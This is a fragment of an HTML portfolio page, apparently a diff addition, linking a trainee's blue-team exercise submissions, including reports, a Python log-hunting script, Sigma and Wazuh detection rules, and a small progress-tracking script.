+<div class="card"><b>06 Oct · Ghost Admin</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/tree/main/ghost-admin">ghost-admin/</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/ghost-admin/SUBMISSION.md">SUBMISSION.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/ghost-admin/GraySentinel_DSOU_GhostAdmin_Report.pdf">Report PDF</a></div><div class="card"><b>06 Oct · Cloud Token</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/tree/main/cloud-token-blackout">cloud-token-blackout/</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/cloud-token-blackout/SUBMISSION.md">SUBMISSION.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/cloud-token-blackout/GraySentinel_RIU_CloudTokenBlackout_Report.pdf">Report PDF</a></div><div class="card"><b>06 Oct · Broken Pipeline</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/tree/main/broken-pipeline">broken-pipeline/</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/broken-pipeline/SUBMISSION.md">SUBMISSION.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/broken-pipeline/GraySentinel_SSOU_BrokenPipeline_Report.pdf">Report PDF</a></div><div class="card"><b>RDP war room · 05 Oct</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/tree/main/rdp-silent-login">rdp-silent-login/</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/SUBMISSION.md">SUBMISSION.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/GraySentinel_DSOU_RDP_SilentLogin_Report.pdf">Report PDF</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/rdp_chain_hunter.py">rdp_chain_hunter.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/rdp_powershell_chain.sigma.yml">Sigma rule</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/wazuh_local_rules_rdp.xml">Wazuh rules</a></div><div class="card"><b>Root</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026">README.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/STEP_BY_STEP.md">STEP_BY_STEP.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/PUSH_TO_GITHUB.md">PUSH_TO_GITHUB.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/render_screens.py">docs/render_screens.py</a></div></div></div>
 </main><footer>Eswar Mahalingam · Blue Team Operator &amp; Trainee · GS-STU-DSOU-2026-039A · Assigned → Built → Tested → Documented → Published → Proven</footer>
 <script>const N=9,boxes=[...document.querySelectorAll('.chk input')];function load(){let s={};try{s=JSON.parse(localStorage.getItem('gs_day1')||'{}')}catch(e){}boxes.forEach(b=>{b.checked=!!s[b.dataset.k];b.closest('.step').classList.toggle('done',b.checked)});upd()}
 function upd(){const n=boxes.filter(b=>b.checked).length;document.getElementById('pct').textContent=n+' / '+N+' verified'+(n===N?' — all proven ✅':'');document.getElementById('fill').style.width=(100*n/N)+'%'}
